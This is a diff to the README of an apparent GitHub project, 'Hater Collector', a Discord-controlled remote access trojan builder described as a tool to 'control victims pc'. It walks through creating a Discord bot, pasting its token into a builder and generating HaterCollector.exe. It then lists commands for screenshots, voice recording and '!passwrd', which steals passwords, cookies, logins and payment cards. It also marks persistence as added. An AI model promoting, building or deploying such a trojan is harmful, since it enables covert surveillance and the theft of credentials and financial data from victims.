@@ -1,11 +1,22 @@
 
-# Hater Collector
- <h3>Python based Discord Rat to control victims pc on discord.</h3>
- 
+<p align="center">
+  <b>🔥 Hater Collector 🔥</b>
+ </p> 
+ <p align="center">
+ <b>UI based Discord Rat Builder to control victims pc on discord.</b>
+ </p>
+
+
+ <p align="center"> 
+<img src="https://img.shields.io/github/stars/0nsec/discord-hater-collector?color=e5c76b&labelColor=22292b&style=for-the-badge"> <img src="https://img.shields.io/github/issues/Mangeshrex/dotfiles?color=67b0e8&labelColor=22292b&style=for-the-badge">
+<img src="https://img.shields.io/static/v1?label=license&message=MIT&color=8ccf7e&labelColor=22292b&style=for-the-badge">
+<img src="https://img.shields.io/github/forks/0nsec/discord-hater-collector?color=e74c4c&labelColor=1b2224&style=for-the-badge">
+
+</p> 
   
  **Requirements:**
 ```
-Python3
+Python3.11 or 3.12
 Windows(x64)
 ```
 Install requirements :
@@ -13,19 +24,26 @@ Install requirements :
 pip3 install -r requirements.txt
 ```
 
-## **Setup Guide:**
-You will first need to register a bot with the Discord developer portal and then add the bot to the Discord server that you want to use to control the bot (make sure the bot has administrator privileges in the Discord server).
-Once the bot is created copy the token of your bot then:
+## Setup Guide:
+- Create a discord bot From [Discord developer portal](https://discord.com/developers/applications)
+    - Add the bot to the Discord server that you want to use to control the bot
+      - (make sure the bot has administrator privileges in the Discord server)
+  - Once the bot is created copy the token.
 
-- All you have to do is double clicking builder.pyw after giving a token you are ready to build the exe by clicking 'Build EXE' button.
+##
+
+## For windows
+- Run `WIN.bat` File it will automatically install `requirements.txt` and run `builder.py`.
+  - Paste your token in builder and click on `Build` button to create Hater Rat exe files.
+    - `HaterCollector.exe` will gen inside the the folder name `dist`
 
 
 ## **Usage**
 <li>
- After getting the victim, send !helpme command in the opened channel</li>
+Use !helpme command in the opened channel</li>
  
 ## **Command List**
-```
+```nasm
 !helpme: Displays commands.
 !ss (number): Takes a screenshot. Specify the number of screenshots to be taken as a parameter.
 !recordvoice (second): Records voice for a specified duration.<br><li>
@@ -54,19 +72,19 @@ Once the bot is created copy the token of your bot then:
 !passwrd : Get Passwords & Accounts Cookies & Logins & Cards & Web History & Downloads & Info.
 ```
 ## **To Do:**
-```
+```bash
 Make a builder for Rat. +
 Make a Gui for builder. +
 Make it more persistant. +
 ```
-## **Contact**
-<li>Discord : 0giv
 
-## **Example Photos:**
+## **Screenshots:**
 <img src="photos/Screenshot (43).png"><br>
 <img src="photos/Screenshot (37).png"><br>
-<img src="photos/photo_5776046485983575576_y.jpg"><br>
-<img src="photos/photo_5776046485983575577_y.jpg" width="600" height="400"><br>
+<img src="photos/Screenshot (39).png"><br>
+<img src="photos/Screenshot (40).png"><br>
+<img src="photos/Screenshot (41).png"><br>
+
 
 
 ## **Disclaimer:**
